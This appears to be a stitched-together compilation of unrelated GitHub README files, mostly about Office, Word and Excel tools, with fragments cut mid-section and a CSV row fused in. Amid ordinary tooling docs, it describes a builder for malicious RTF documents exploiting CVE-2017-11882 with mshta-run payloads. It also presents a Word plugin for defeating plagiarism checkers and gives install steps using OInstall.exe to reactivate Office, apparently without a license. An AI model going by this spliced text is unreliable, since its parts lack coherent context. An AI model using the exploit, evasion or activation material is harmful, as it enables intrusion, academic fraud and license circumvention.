The result of the analysis is written in the ./report/datatable.js file and a web HMI is available here ./report/template.html

A list of curated values and ideas to maintain a motivating and positive culture. 

All employees/employers across the world can add their own ideas of an awesome culture and soft skills which helps us understand each other more. 

Each individual having their own thoughts and ideas is what makes us move forward. We only become better by allowing others to challenge our ideas in a constructive way. Everyone is encouraged to raise issues for any points they disagree with and everyone can post their opinion about it. 

# Multiculturalism
- Always cater for all employees'/colleagues' dietary requirement and make it your priority when doing team lunches or bringing in sweets. Some of the popular dietary requirements are vegetarian, vegan, gluten free, dairy free, halal meat, halal chicken. If you're not sure about their requirements, ask them politely. If you can't reach them at the time being, include vegan options.

# New Employees Joining
- Prepare a set of questions for newcomers and give it to them. They can take their time asking those questions. They can choose to post their answers publicly so that their colleagues would know their likes/dislikes, or they can keep it private with their HR. Those questions may also include dietary requirements so when a company lunch is scheduled, their needs would be taken into consideration.
- Appreciate new employees when they merge their first Pull Request (Engineering)
- Have a map of the office with the names of the employees on it and their roles. It's probably already hard for newcomers to interact with new people in the company. What makes it worse is that they don't know their colleagues' names and roles.
- Have a clear list of values that employees can use as a reference.
- Ask new employees about their dietary requirements just to make sure you cater for them during lunches

# Team Building
- Organize a game of mafia or other social deduction games across the whole company (https://en.wikipedia.org/wiki/Werewolf_(social_deduction_game))
- Create a meaningful award system where employees feel that they're actually special in a specific area. Awards can be related to technical or soft skills.

# Task Management
- Reduce context switching as much as possible. Usually employees get frustrated when they have to work on 10 things at the same time. If there's no way around it, employers have to appreciate that employees are doing an extra cognitive effort and ensure them that they understand their struggles.
- Allow employees to contribute to work outside their area of expertise. For example, software developers working on UX or UI design.

# Office Management
- Create a roster that will split office tasks across employees. Tasks can be as simple as cleaning up, time keeping, managing the fridge, picking up mail. This roster will change every month so that different employees always have different tasks.

# Communication
- Embrace asynchronous communication and make meetings your last resort
- Always reply to people when they post comments on communication tools (Slack, Trello, Jira ...). What is sad is for a person to spend time writing a message and nobody replies or even reacts to it. If you don't know the answer point them to someone that might know

# Ice Breakers/Small Talks
- Ask about the weekend on Mondays and the plans for the weekend on Fridays

Command line utility to aid in writing sprints.

| Sit Down | And Write |
| --- | --- |
| <img src=""screenshots/sprint1.png""> | <img src=""screenshots/sprint2.png""> |

## Purpose

This is a simple tool to ""benchmark"" writing speed over a given time period.
It is targeted at Unix people who get their writing assignments done by 
[sprinting](http://xulonpressblog.com/author-inspirations/writing-prompts-word-sprints/) and
prefer a minimal console program to some big GUI app. In retrospect this might indeed be
a very narrow target audience. 

###### Supported Documents
* Plain Text
* Odt (OpenOffice)
* Docx (Microsoft Word)
* TeX (Experimental, everything between `\begin{document}` and `\end{document}` will be fed through a rudimentary 
regex filter to skip formating commands.)

## Dependencies
* The fancy statistics are implemented via [Ncurses](https://invisible-island.net/ncurses/ncurses.html).
* [Libmagic](https://www.darwinsys.com/file/) for file identification.
* [Libzip](https://libzip.org/) for odt and docx files.

## Installation
[Cmake](https://cmake.org/) is used to build the program. After extracting the sources the build procedure
would look something like this:

```
mkdir build
cd build
cmake ../ -D CMAKE_BUILD_TYPE=Release
make
```

## Usage
All properties of the writing sprint are set on the command line:

`wordsmith -f <path-to-manuscript> -t <sprint-time-in-minutes>`

Don't forget to save your document once the sprint is over! (Also, since the philosophy of sprinting is that
the only valid direction is forward, the script will report a negative value if the word count has been reduced.)

## Limitations
* No GUI (obviously). There might be a Qt version in the future.
* Windows is currently not supported.

Le progiciel MonsterBook (L'oeuvre inhumaine) est un logiciel que j'ai développé de 1991 à 2007 sur AMD 386, 40 Mhz sous DR DOS 7 et MS DOS 5, MS DOS 6.
Il ne fonctionne qu'en mode réel du 8086 et n'est compilable qu'avec le Turbo Pascal 7 en mode protégé.
Il s'agit d'un environnement graphique avec des applications intégrés, tableur, traitement de texte, dessin en bitmap, dessin en fil de fer, interpréteur BASIC, terminal avec les commandes DOS, UNIX, ...

J'ai mis une licence MIT avec le projet. Fait des fork, autant que voulez, le projet est dépassez maintenant. Mais il peut être fort instructif.
Il y a du code de cacher, comme mon arbre généalogique, car je voulais être certain que le code me serait pas volé. Mais les choses ont changés, et je ne crois plus poursuivre son projet pour le moment.

A l'origine, j'utilisais le titre les Chevaliers de Malte, plutôt que Gladir.com. J'utilisais un nom au pluriels, mais j'ai toujours été un seul développeur.

<h3>Compilation</h3>
  
Le programme principale est MB.PAS. Personnellement, j'utilisais Borland Pascal 7. Vous pouvez par exemple utiliser DOSBox et lancer BP a l'intérieur de celui-ci.

Le code MB.PAS est situé dans le dossier ""\Source\Chantal\"" et est la racine projet. Il n'est pas compilable en dehors de ce dossier.

This is a template for developing an [Office.JS](https://learn.microsoft.com/en-us/office/dev/add-ins/) Excel add-in with **Vite** and **React 18**. The main advantage of using this template is a much faster development cycle. The development server starts in just 2-3 seconds and hot-reloaded changes are near instant.

## Key differences

This template was generated using the [generator-office](https://www.npmjs.com/package/generator-office) generator which is based on the [Office-Addin-Taskpane-React](https://github.com/OfficeDev/Office-Addin-TaskPane-React) project.

These are the key differences between this template and the default generated template:

- Use Vite instead of Webpack.
- Use React 18.
- Remove polyfills and support for IE 11.
- Enabled typescript strict mode

## Usage

To start the development server, run:

```
npm run dev
```

To load the add-in in your Excel, use any of the `start` scripts. e.g:

```
npm run start
```

To create a production build, run:

```
npm run build
```

## Legacy Browsers

This template does not include support for IE11. If you need support, add [@vitejs/plugin-legacy](https://github.com/vitejs/vite/tree/main/packages/plugin-legacy).

## Features

The deployment of addins and extensions of Microsoft Office Word & Exel, depends on shared libraries and VBA macro ... can be hard.

 - Install Excel addins on a PC client. Excel macro must be stored in a *.xlam file, and saved in the appropriate folder. By convention, all Excel addins are saved in : `c:\users\[name]\AppData\Roaming\Microsoft\AddIns\` ;
 - Activates automatically all Excel addins, by updating the Windows registry.
 - Install Word addins on a PC client. Word macro must be stored in a *.dotm file. In order to use shared Word VBA macro in all Word files, we have choosen to saved *.dotm file in this folder : `c:\users\[name]\AppData\Roaming\Microsoft\Word\STARTUP\` 
 - Give a process to customize the Excel ribbon and Word ribbon for making easy interactions with office extensions.

## Available Scripts

In the project directory, you can run:

### `npm start`

Runs the app in the development mode.<br>
Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

The page will reload if you make edits.<br>
You will also see any lint errors in the console.

### `npm test`

Launches the test runner in the interactive watch mode.<br>
See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.

### `npm run build`

Builds the app for production to the `build` folder.<br>
It correctly bundles React in production mode and optimizes the build for the best performance.

The build is minified and the filenames include the hashes.<br>
Your app is ready to be deployed!

See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.

### `npm run eject`

**Note: this is a one-way operation. Once you `eject`, you can’t go back!**

If you aren’t satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.

Instead, it will copy all the configuration files and the transitive dependencies (Webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you’re on your own.

You don’t have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn’t feel obligated to use this feature. However we understand that this tool wouldn’t be useful if you couldn’t customize it when you are ready for it.

Addresses are also gathered from an external file (see ADDR.TXT).

## Parameters

| Parameter     | Explanation                | Default value |
| ------------- | ---------------------------| --------------|
| `-ItemCount`  | Sets the number of items to generate |  N/A |
| `-WordSourceFile` | External file containing words to generate body content | `.\words.txt`|
| `-AddressSourceFile` | External file containing addresses for To/From fields | `.\addr.txt`|
| `-SubjectWordCountMin` | Minimum number of words in subject | 1 | 
| `-SubjectWordCountMax` | Maximum number of words in subject | 8 |
| `-BodyWordCountMin` | Minimum number of words in message body | 30 |
| `-BodyWordCountMax` | Maximum number of words in message body | 200 |

## Hotpho-VSTO
An experimental and educational proof-of-concept VSTO Word plugin demonstration of defeating online content originality checkers. Will not survive a through inspection by design.

## Installation

(No executable binary file will be provided to provide a barrier of entry; intended to deter unwarranted misuse and widespread abuse of the concept.)

1. Clone the Hotpho repository.
2. Open the Hotpho.sln in Visual Studio.
3. Build the plugin.
4. Word will launch with the plugin installed as a debug build.

## Usage

1. Install the plugin.
2. Open Word 2013.
3. Highlight the range of text to obfuscate.
4. Click on the ""ADD-INS"" tab on the Ribbon in Word.
5. With the range of text highlighted, click the ""Obfuscate Selection"" button in the Hotpho plugin's ribbon section.

## Contributing

*(Kept as is from template.)*
1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D

## History

The application's purpose for me was to explore the venue of developing plugins for Microsoft Office using the VSTO platform. The platform is relatively niche, and was a pleasant learning experience. The idea sprung about was when I noticed while submitting a document on a certain classroom platform at the local college that it had a ""originality check"" score next to my file submission. I didn't give a hoot what the score was (since I cite my sources and enjoy writing enough to not plagiarize), but now I was curious as to what made this peculiar feature tick. Research revealed that similar services and platforms highlight crossing sentence structure and content to the submitted document. One source in particular noted how students would add ""filler"" content in between page breaks and words- none said anything about characters though (which would be laborious).

## Defending against this plugin

There are a number of ways to defeat this plugin. They all either involve considerable effort in terms of processing volume, labor, or some clever implementations of solutions:
1. The students actually write the paper themselves and cite the sources. (Pros: Honesty and guaranteed originality check pass. Cons: requires effort.)
2. The teachers carefully read the paper students submit. (Pros: Careful and accurate detection of linguistic discrepancies among their student. Cons: requires effort. Not feasible when delegated to TAs or for larger college classrooms.)
3. Teachers check for the originality flag. Consider the false positive paradox- a paper, sufficiently lengthy enough, with a 100% originality score should be worth a read, and at the minimum, an inspection, as the paper could be a wholesome and thoughtful read or loaded with complete gibberish and rubbish to fool the checker. (Realistically, completely original papers should not have 100% originality score as they must pull their linguistic and syntaxical influences from *somewhere*. (Pros: Filtered screening, talent discovery. Cons: requires effort and checking.)
4. Revealing the ""Hidden"" text property in word, or showing raw text outside of Word (aka a service). (Pros: Guaranteed screening and proof of dishonesty. Cons: not feasible for bulk submissions.)
5. Teachers and graders copy/paste from the document into an online checker. (Pros: copy/pasting text with hidden content only copies visible text, effectively defeating any hidden text obfuscation. Cons: not feasible in bulk submissions)
6. Configure the originality checker to ignore all hidden content. (Pros: logically sound option to use. Cons: third-party feature submission & development required)

The Hotpho plugin got its name as a reference to a track on certain underrated band's album.

peapresent aims to be a program that compiles text in a specific format into a presentation in html format.

## Why html?
Current options for creating presentations may not be FOSS and may require proprietary software to run. Furthermore, they may not be cross-platform and cannot be viewed on different operating systems.

The peapresent compiler/decompiler aims to compile .pp files into an interactive html file so that any machine with a web browser can view and edit the presentations, vice versa.

## Why not use a GUI?
Text editors are easy to use, and can make it easy to define global settings for the presentation. Writing your presentation in text format will also allow you to focus on the content of the presentation and not on other aspects.

By storing your presentation files in text, it makes it easier to collaborate in groups without facing compatibility issues. Imagine working on your presentation as a group on GitHub!

## How do I use peapresent?
Check out our [User Guide](docs/UserGuide.md) to get started on peapresent!

## How can I contribute?
If you're a developer and would like to contribute, see our [Developer Guide](docs/DeveloperGuide.md) to see how you can get started on contributing to the code base.

Automate boring stuff with Python.

This is my first book about coding.

Theses codes are written in the process of learning this book.

It not only includes most practice from this book and but aslo some interesting stuff I made up with.

I am sorry for the mess of my code, I don't realize that I will upload my file to my github when I was writing this.

I have to say it's a great book to start to code.

You can learn very useful and pratical skills to solve automatic problems in your office, such as excel,pdf,word,email,etc.

But it also has a big disadvantage that it's too simple so that it just tells you how to do without expilicit explaination.

As I say, it's just a start!

Anyway,welcome to the code world!

You will love it!

Note: although this application is been used and tested, this code has not yet completed a best practices or security review. We take no responsibility for any loss you may incur through the use of this code. However, we encourage you to run and test it for further improvements. 

The current open version is made of several Drupal 8 modules:

- addresses book
- products and services
- assets
- documents management
- sales (purchases, quotations, invoices)
- human resources
- logistics (delivery orders, stock list)
- project management
- report drafting
- finance (accounts, reporting, journal) 

An online demo site is available [here](https://ek.demo.arrea-systems.com/ek-demo-management-software) (with further modules and functions not included into this open source version).

## Install

To install via composer, run:
```
composer require arreasystem/ek:""dev-8.x-dev""
```

Add extra composer.json file to main Drupal composer.json:

```
""merge-plugin"": {
            ""include"": [
                ""modules/ek/ek_admin/composer.json"",
                ...
```

## Further setup

After modules are enabled, you will need to run the application setup process.
For this, navigate to /ek_admin from your browser. Specific tables and settings will be done after
creating a dedicated database. 
Other settings are not covered here as it implies many custom business questions.
An initial setup description can be view [here](https://arrea-systems.com/tutorial-setup) with other online description manuals.
There are also some videos covering this subject in the tutorial pages.

Some issues are reported and answered on [Drupal project page](https://www.drupal.org/project/issues/2887559?text=&status=All&priorities=All&categories=All&version=All&component=All)

## Contribution

Currently there is no contributor except initial developer.
Any cooperation is welcomed.
The main target (or issue, depending on point of view) would be to make the code fully compatible with Drupal 8 standard
and more specifically create full content entities per modules. This will help extend application,
enhance customization capabilities and interface with other systems.

## A Macro to speed up powershell connections to Office 365

Rather than Googling or copying\pasting the few lines needed to connect a PowerShell session to Office 365, just use this Module!
Microsoft is moving away from this method of connecting to Office 365 via PowerShell, so I would check the [PowerShell Gallery](https://www.powershellgallery.com/) first to see if there are any other modules that already do this.
For example [Exchange Online Management](https://www.powershellgallery.com/packages/ExchangeOnlineManagement/0.4368.1) is the new recommended way to connect to Office 365 via PowerShell when managing email related things.
This is just here for any legacy reasons to connect to Office 365 via PowerShell while they still exist.

# How to
`Connect-O365` or `o365` then enter the username@domain and password for the Office admin account you are trying to connect to.

# Install Instructions
This module is not yet signed and uploaded to PowerShell Gallery, just download the folder from this repository and place it in a module folder.

Spreadsheets from my work as Radiation Physicist Assistant at Cookeville Regional Medical Center. Also includes a few Excel and Word VBA scripts. Some spreadsheets have sensitive information redacted—thus the filenames ending in _REDACTED_. All files were created in Excel or Word 2016 and are not guaranteed to work in any other version of Excel/Word.

Some spreadsheets include ""How to Use"" instructions for end users, plus technical/implementation information as appropriate. These technical details are only necessary for anyone modifying the spreadsheet beyond entering data.

This document is technical/implementation information for the VBA scripts.
## CustomValidation
Excel add-in for data validation that cannot be done using Excel's Data Validation alone.

The add-in contains a single module with several functions. Each function's name starts with `Validate` (e.g., `ValidateMRN`). Most functions takes a single argument: the range (must be a single cell) whose value to validate. Each function returns `True` if the value is valid, `False` otherwise.

These functions are meant to be used in named ranges which can be used in Custom Data Validation.
### Example
Here is an example of implementing custom data validation using this add-in, named ranges, and Excel's built-in Data Validation.

In my [Brachy Txs](./Brachy Txs.xlsm) spreadsheet, each `Pt` value must be either an MRN or a patient name. The `CustomValidation` `ValidatePatient` performs this validation. To implement the validation, I:
1. Create a `Validation` table with a column `ValidatePt`.<br>
<img src=""./images_for_readme/CustomValidation/Validation_table.png"" alt=""Validation table""/><br>
<img src=""./images_for_readme/CustomValidation/Validation_table_name.jpg"" alt=""Validation table name""/>

2. In the first row of the `ValidatePt` column, call the `ValidatePatient` function, passing in the `Pt` cell as an argument.<br>
<img src=""./images_for_readme/CustomValidation/call_ValidatePatient.png"" alt=""call ValidatePatient""/>

3. Create a named range from the cell in the previous step.<br>
<img src=""./images_for_readme/CustomValidation/named_range.jpg"" alt=""Named Range""/>

4. Fill in the remaining rows of the `Validation` table.<br>
<img src=""./images_for_readme/CustomValidation/remaining_Validation_rows.png"" alt=""remaining Validation rows""/>

5. Add Data Validation to the `Pt` column. Use the range name as the custom formula.<br>
<img src=""./images_for_readme/CustomValidation/Data_Validation.jpg"" alt=""Data Validation""/>

## FmtTbls
Macro that applies a standard format to all tables in the current Word document. Specifically, it does the following:
- Sets default borders.
- Horizontally and vertically center aligns table values.
- Sets uniform row height.
- Center aligns the table.
- AutoFits column widths.
- Disallows the table from spanning multiple pages.
- Bolds the first row (header row).
- Changes red text to black highlighted text.
- Sets the font.

## RedactedSpreadsheet
Excel add-in for redacting sensitive values from tables in a spreadsheet. A copy of the current workbook is created, with the following cell values replaced with `[redacted]`:
- Email addresses
- Non-blank cell values in the user-specified columns
The add-in contains a single macro, `RedactedSpreadsheet`.
### Example
I used the `RedactedSpreadsheet` add-in to redact sensitive information in my `Credentials & Computer Info` spreadsheet. Here are my steps:
1. I want a redacted copy called `redacted`.<br>
<img src=""./images_for_readme/RedactedSpreadsheet/filename.png"" alt=""Filename prompt""/>

2. For each table in each sheet, I specify the columns I want desensitized. In table `Creds`, these are `Username` and `Password`.<br>
<img src=""./images_for_readme/RedactedSpreadsheet/redact_columns.png"" alt=""Column names prompt""/><br>

## What is the Virtual Secretary ?

Imagine a world where :

* emails get tagged ""urgent"" if your agenda records an appointment in less than 48h with the email sender,
* terribly long emails get tagged ""call me"" if you have the phone number of their senders in your contact book,
* emails with `.ics` calendar events invites get tagged ""RSVP""
* emails get sorted in folders by the vCard category in which their sender is, so your college alumni don't get mixed up with your family,
* emails sent by people into your customer SQL database or CardDAV address book automatically get a ""client"" label,
* emails sent by bulk-emailing systems (newsletters, services/products updates) get moved out of the way to their own folder, for you to read when you have time,
* emails containing questions/inquiries are labelled ""action requested"" and automatically add a new task in your agenda, at your next available slot, with an email sent back to the sender notifying them when their question will be processed,
* etc.

The Virtual Secretary connects to :

* your IMAP email server (incoming emails), *[implemented]*
* your SMTP email server (outgoing emails), *[implemented]*
* your CardDAV contacts server, *[to do]*
* your CalDAV agendas server, *[to do]*
* your MySQL/MariaDB databases server. *[to do]*

It then provides you with an high-level Python interface to write email filters that can cross-check data through emails, contacts, agenda and databases and define actions like (un)tagging/moving/deleting emails, updating contacts or appointments data, etc. It can also define auto-responders, email digests, etc.

It provides high-level machine-learning NLP (*natural language processing*) methods to parse textual content that can be easily used in your filters and and can be re-trained yourself:

* a pre-trained sentences classifier that can identify questions, statements, etc. in English text, with a confidence of 77.7% (seems to work well for French too), *[work in progress]*

Aside of the simple filter use cases, it lets you use the full extend of Python ecosystem and scripting to use machine-learning modules, regular expressions pattern matching, or even write your own server/data connectors.

It comes with a large range of example filters that can be used as-is or as templates, including a ready-to-use anti-spam system using IP blacklist/whitelist.

The functionnal logic is very similar to the one of [IFTTT](https://ifttt.com/explore/new_to_ifttt), plus the whole Python ecosystem to extend actions, minus the toy GUI, without the anxiety of SaaS (shit as a software) owned by some company that may go out of business or extinct the product (wink wink [Yahoo! Pipes](https://en.wikipedia.org/wiki/Yahoo!_Pipes)).


## How it works

The `main.py` scripts needs to be called with the path to a configuration directory, like `python main.py ~/secretary/config process`. Say you have 2 email addresses, `me@domain.com` and `pro@domain.com`, you need to create a folder for each email plus one `common` folder in your `config` directory. Then populate them with your filters, named like `00-protocol-filter.py` and your credentials into a `settings.ini` configuration file. This gives you :

* `/config`:
  * `/common`:
    * `00-imap-spam.py`
    * `01-imap-urgent.py`
  * `/me`:
    * `settings.ini`
    * `03-imap-family.py`
    * `04-imap-banks.px`
  * `/pro`:
    * `settings.ini`
    * `03-imap-colleagues.py`
    * `04-imap-clients.py`

The filters put in `/common` folder will be used for all email addresses. The filters put in the email folder will be private to this email account. The `/common` folder needs to have this exact name, but the email folders can be named whatever you like and will be run in alphabetical order.

Filters will be processed in the order defined by their 2-digits priority prefix, from `00` to `99`. A `LEARN` prefix can be used instead of the 2 digits to define special filters that collect data in a read-only fashion and may use heavy processing. If the same priority level is found in both the global `common` folder and a local email folder, the global filter is overriden by the local one with a warning issued in terminal. Priorities are shared between protocols.

The script will process all the filters it finds in all the folders it finds, so you just need to create folders and filters.

The protocol that triggers the filter needs to be written in the filter name just after the priority. The available choices are `imap`, `carddav`, `caldav`, `mysql`. Even though filters can connect different protocols, one of them needs to be the input signal that will trigger the whole filtering, so for example, the `imap` trigger will launch the filters for each email in some mailbox and then dispatch events to other accounts.

The `settings.ini` need to contain the login credentials for at least the trigger protocol of each filter, like :

```ini
[imap]
user = me@server.com
password = XXXXXXXX
server = mail.server.com
entries = 20

[smtp]
user = me@server.com
password = XXXXXXXX
server = smtp.server.com
```

Filters are defined like such: in a `01-imap-invoice.py` file, write :

```python
#!/usr/bin/env python3

protocols = globals()
imap = protocols[""imap""]

def filter(email) -> bool:
  return email.is_in(""invoice"", ""Subject"") or email.is_in(""invoice"", ""Body"")

def action(email) -> None:
  email.move(""INBOX.Invoices"")

imap.get_objects(""INBOX"", n_messages=20)
imap.run_filters(filter, action, runs=1)
```

This very basic filter will fetch the 20 most recent emails (`n_messages=20`) from the mailbox `INBOX` (the base IMAP folder), look for the case-insensitive keyword ""Invoice"" in the email body and subject, and if found, will move the email to the ""Invoices"" IMAP folder. This folder will be automatically created if it does not exist already. The filter will be run at most one time (`runs=1`) for each email, which means that if you manually move the emails back to `INBOX` after the filter is applied, the next run will not move them again to ""Invoices"". The history of runs is stored in an hidden log file named `.01-imap-invoice.py.log` where emails are identified globally for all the folders in the email account, and the history is kept even if you change the content of the filter in the future.

To run all the typical filters (prefixed with 2 digits and processing data read-write) in sequence, for all subfolders in the config directory, call :
```bash
python src/main.py /path/to/config process
```

To run all the learning filters (prefixed with `LEARN` and processing data read-only) in sequence, for all subfolders in the config direcotry, call :
```bash
python src/main.py /path/to/config learn
```

You may find several example filters in the `/examples` folder, along with the source code.

When you run the `main.py` script, it will create a `sync.log` file into each email folder logging all operations applied on emails, connection statuses and available IMAP folders. This will help writing and debugging your filters. Errors and exceptions of the program are logged in the standard output of the terminal you used to launch the main script.

## Installing

1. Install Git and Python 3.10:
   1. On Debian, Ubuntu and their derivatives (Mint, etc.): `$ sudo apt install git python3.10 python3-pip`
   2. On Redhat and all its derivatives (Fedora, CentOS, etc.): `$ sudo dnf install git python3 python3-pip`
2. Clone this repository: `$ git clone https://github.com/Aurelien-Pierre/VirtualSecretary.git`
2. Install the required dependencies: `pip3 install python-dateutil vobject requests requests-oauthlib nltk PySide6 py3DNS dnspython dkimpy scikit-learn gensim beautifulsoup4 pandas pyspf`
3. Get into the directory: `$ cd VirtualSecretary`
4. Copy the `examples` to your own `config` folder : `cp examples config`. This is important because updates may erase your changes within the `examples` folder.
5. Edit the content of the `settings.ini` within `config/me@server.com` with your own credentials
6. Run the learning stage: `$ python src/main.py config/ learn`
7. Run the filtering stage: `$ python src/main.py config/ process`

To run the filters in background, for example on a server, you may use a cron job :

1. Start the cron editor: `$ crontab -e`
2. To execute the Virtual Secretary processing stage every 10 minutes (starting on flat hours), write the following rule:
`$ */10 * * * * python /home/your_user/path/VirtualSecretary/src/main.py /home/your_user/path/VirtualSecretary/config process &>> /home/your_user/path/VirtualSecretary/config/secretary.log`
3. To execute the Virtual Secretary learning stage every day at 0h05 and 12h05, write the following rule:
`$ 5 0,12 * * * python /home/your_user/path/VirtualSecretary/src/main.py /home/your_user/path/VirtualSecretary/config learn &>> /home/your_user/path/VirtualSecretary/config/secretary.log`
4. Save.

The `&>> secretary.log` part will save the runtimes, errors and warnings of the program to a `secretary.log` file inside your config directory. This may contain useful information to troubleshoot your installation. The program will also create a `sync.log` file in each subfolder, containing the report of all operations performed on the triggers (like email moved where, tagged how, etc.).

Note that a locking mechanism prevents 2 instances of the Virtual Secretary to process the same subfolder at the same time. If the previous run did not end before the next one starts, the next one will be aborted. When you run `$ python src/main.py` (with the proper arguments, see above), it will give you the global execution time at the end. Your delay between 2 cron jobs needs to be at least this time. This is also why we start the learning stage 5 minutes off the flat hour in the example above.


## Updating

1. Get into the directory: `$ cd /path/to/VirtualSecretary`
2. Run Git pull: `$ git pull`

# Introduction

<b>CVE-2017-11882</b> - The unique vulnerability identifier of Microsoft Office 2007 Service Pack 3, Microsoft Office 2010 Service Pack 2, Microsoft Office 2013 Service Pack 1, and Microsoft Office 2016 allows an attacker to run code in the context of the current user without properly handling objects in memory, the so-called ""Microsoft Office Memory corruption vulnerability"".
The implementation includes creating a program for building malicious rtf documents and payloads in VBScript

<b>The principle of operation</b>
--
It is rtf documents that are vulnerable for the reason that they can be ""programmed"" by knowing special commands-RTF Headers. Thus, a binary (executable) object is created in the body of the document, in fact, it is a Microsoft Equation formula with the code that contains the cmd command. Then you can generate the payload in VBScript and use the command "" mshta link to the payload file” to execute the hta file.

trevorHsu,docxload,,https://github.com/trevorHsu/docxload,https://api.github.com/repos/docxload/trevorHsu,to generate .docx files on front-end by using tag template,"# docxload
![NPM version][npm-image]

[中文文档][cn-doc-url]

To generate .docx files on front-end by tag template.

<br>

> **docxload** is a tool for generating .docx files, which is developed based upon [docx][docx-url]. The package **docx** has rich configuration to meet most of demand about setting document content and content style, but its detailed configuration rules sometimes would generate a relatively complexed code. When there are too many document style or content, **docx**'s nested style code would become low-readable, which is not good for maintenance. 
<br><br>
**docxload** simplifies **docx**'s configuration. It uses tag string to represent **docx**'s class and generates **docx** configuration by combining different tags, which is easier to code and to read.

<br>

## Installation
```shell
$npm install --save docxload
```

<br>

## Usage
```js
import docxload from 'docxload'

// when a tag attribute's data type is string, using Double quotes
// when a tag attribute's data type is js expression, using curly braces
// a tag attribute could have multiple subattributes configured as ""key1: value1; key2: value2;"", such as the ""underline"" attribute
let template = `
  <page>
    <p>
      <span 
        underline=""type: single; color: #000;""
        color=""#000""
      >Hello, </span>
      <span font-size={30}>docxload</span>
    </p>
  </page>
`

docxload(template).then(() => {
  console.log('done')
}).catch(err => {
  console.log('failed', err)
})
```
For more configuration examples, check out [demo][demo-url].

<br>

## API
```ts
function docxload(template: string, option?: object | string): Promise
```

### Payloads:
**docxload** has 2 parameters：<br>
*template*：tag template；*option*：configuration option，is an optional parameter；<br>

When *option*'s data type is string, it would set the generated file's name;<br>
When *option*'s data type is object, it has following configuration fields:
| Field | Description | Type | Default |
| - | - | :-: | - |
| fileName | the generated file's name，its default extension name is *.docx* | String | data.docx |
| immediate | whether to generate a document immediately;<br> if false, docxload will generate the document's binary data in memory | Boolean | true |

### Returns:
--------------------------
**docxload** would return a Promise instance which resolves an array **[blob, exportFile]**:
| Array Member | Description | Type |
| - | - | - |
| blob | a Binary Object of the file to be generated | Blob |
| exportFile | a method for generating a file;<br> *exportFile(blob, fileName)*<br>accepts 2 parameters：blob as binary object，fileName as file name | Function |

### Example:
```js
let template = ...
function docxToPdf() { ... }

docxload(template, { immediate: false }).then(([blob, exportFile]) => {
  // processing the blob object
  let pdfBlob = docxToPdf(blob)
  exportFile(pdfBlob, 'data.pdf')
}).catch(err => {
  console.log('failed', err)
})
```

<br>

## Tags
**docxload** has 2 types of tag：<br>
1. corresponding with a class in **docx**, supporting almost all the configuration of the class;
2. representing some configuration code of **docx**

<br>

| Tag | Description | Class in **docx** | Configurable |
| :-: | - | :-: | :-: |
| \<page>\</page> | a page in the document | - | √ |
| \<title>\</title> | title | - | × |
| \<p>\</p> | paragraph | [Paragraph][docx-doc-paragraph] | √ |
| \<span>\</span> | text | [TextRun][docx-doc-text] | √ |
| \<img /> | image | [ImageRun][docx-doc-image] | √ |
| \<table>\</table> | table | - | √ |
| \<row>\</row> | a row of the table | - | √ |
| \<cell>\</cell> | a cell of the table | -  | √ |
| \<br /> | break line | - | × |
| \<template>\</template> | a placeholder, no meaning | - | × |

<br>

Tags should be nested according to the following level rules, tags at the same level should not be nested:

**page** > **title, p, table** > **span, img, br**

**table** > **row** > **cell**

*note: the second level of the tags must be one of \<title\>, \<p\> or \<table\>.*

*\<template> can be embeded in any tag level; <br> when writing a template in jsx syntax, some environment require a root tag in the template; \<template> can be the root tag.*

<br>

## Tag Attributes

Microsoft Office 2021 installer (you can customize your installation to preference)

2. The direct link will be in the about section, once downloaded the ISO file you must mount it as a unit (note that the iso file weighs approximately 4 GB)

3. Once mounted, the file called OInstall.exe is executed as administrator

4. After executing it, a window will open with varieties of boxes to check and uncheck. Completely on the right is a list of the languages in which you can install the services

5. In the first category, by default Microsoft Office 2016 will be selected, but by displaying it you can choose between the 3 that exist. The first is from Microsoft Office 2013, secondly Microsoft 2016 and finally Microsoft 2019-2021. To your preference which version to choose

6. As an example I will use the 2019-2021. Just below the box of the versions, there will be another one that you can choose the volume, of recommendation if you chose the 2019-2021 keep the ProPlus Volume.

7. And it's up to you to mark and uncheck the products you want to install

8. Once you have marked your products on the left there will be a button that says Install Office is obviously clicked to install.

9. Once the products are installed it is recommended to sign in with a Microsoft account. We return to the installer and give it in the utilities and settings section, check the box of office reactivation task and then in Activate Office.

10. And enjoy.

### 键盘标签      

### 展开/折叠显示       

前几天在 GitHub 上的 README.md 文档中添加了一个展开/折叠显示的内容块，但不知道怎么实现，后来意外地在自己收藏的文章中看到了实现方法。      

举个例子，如果你想在 Markdown 中添加展开或折叠显示的内容块，需要用到 <kbd>details</kbd> 和 <kbd>summary</kbd> 两个标签。

## Übersicht

![](img/Datenzusammenhang.png ""Zusammenhang"")
![](img/GUI_Preview.png ""GUI Preview"")

Schulen müssen mit einem knappen Budget auskommen, hiermit können sie ohne weitere Investition Ihre Zeugnisse komfortabel erstellen. 

Vorlage in Word anlegen, dazu die Daten übersichtlich in Excel vorbereiten/eintragen und in einer art Serienbrief ausgeben.

Das beigelegte Excel Demo kann bis zu 30 Schüler verarbeiten, diese Grenze kann bei Bedarf in Excel erweitert werden.
Alle auszulesenden Excel Daten sind im NamensManager zu finden. und können darüber konfiguriert werden.

Die Demo Word Vorlage ist mit dem Kennwort ""demo"" geschützt.

## Kompilieren

Um Datenschutzkonform zu bleiben, lässt sich dieses Tool als *.exe exportieren und an die Kollegen weiter verteilen.

Dazu ein venv anlegen und die Pakete der requirement.txt installieren.

Die build.bat aus dem venv heraus gestartet, erzeugt einen dist Ordner, in dem das fertige Porgramm abgelegt wird. 

# Nutzung 

## Konfigurieren
Damit man nicht immer bis zum Ziel navigieren muss, lässt sich der Dokumentenstartordner ändern.
 - Dazu gehe auf ""Config"" -> ""Wähle Dokumentenstartordner""
 - Zum gewünschten Ordner navigieren und öffnen

## Excel und Word Zeugnis Vorlage auswählen
 
1. (1) ""Docx Zeugnisvorlage"" wählen/öffnen
2. (2) ""Excel Zeugnisse"" öffnen
